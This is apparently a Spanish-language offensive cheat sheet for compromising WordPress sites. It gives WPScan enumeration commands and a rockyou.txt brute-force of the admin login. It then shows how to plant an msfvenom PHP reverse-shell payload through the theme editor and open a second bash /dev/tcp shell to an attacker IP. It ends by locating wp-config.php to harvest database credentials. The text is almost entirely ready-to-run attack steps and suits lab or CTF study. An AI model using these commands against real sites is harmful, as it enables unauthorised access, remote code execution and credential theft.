# WordPress

WordPress es uno de los CMS más usados. Herramientas como WPScan permiten auditar su seguridad.

## Configurar /etc/hosts

Si la página se ve sin estilos (CSS roto), hay que mapear el dominio en `/etc/hosts`:

```bash
sudo nano /etc/hosts
<IP_objetivo> <dominio_wordpress>
```

## Enumeración con WPScan

```bash
wpscan --url http://<IP>/blog --enumerate u,vp
```

- `u` -> Enumera usuarios
- `vp` -> Enumera plugins vulnerables

Para enumerar plugins de forma más específica.

```
wpscan -e p --url https://10.129.12.10 --disable-tls-checks --no-banner --plugins-detection aggressive -t 100
```

- `-e p` -> Enumerar plugins
- `--disable-tls-checks` -> Omitir comprobaciones TLS
- `--plugins-detection passive` -> Establecer detección de plugins en modo pasivo
- `-t 100` -> Usar 100 hilos para acelerar la enumeración
- `--plugins-detection aggressive` -> Detección de plugins más intensiva

## Fuerza Bruta al Login

```bash
wpscan --url http://<IP>/<blog> --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

## Obtener Reverse Shell

Una vez dentro del panel de administración:

1. Ir a **Appearance > Theme Footer**
2. Reemplazar el contenido con el payload generado:

```bash
msfvenom -p php/reverse_php LHOST=<IP_atacante> LPORT=<puerto> -f raw > pwned.php
```

3. Ponerse en escucha:

```bash
nc -nlvp <puerto>
```

4. Al guardar los cambios y recargar la página, se recibe la shell.

## Reverse Shell Adicional

La shell obtenida puede ser inestable, por lo que conviene enviar una segunda:

```bash
nc -nlvp <puerto>
bash -c "sh -i >& /dev/tcp/<IP_atacante>/4444 0>&1"
```

## Encontrar Credenciales en wp-config.php

```bash
find /var -name 'wp-config.php' -type f 2>/dev/null
```

> El archivo `wp-config.php` contiene las credenciales de la base de datos de WordPress.

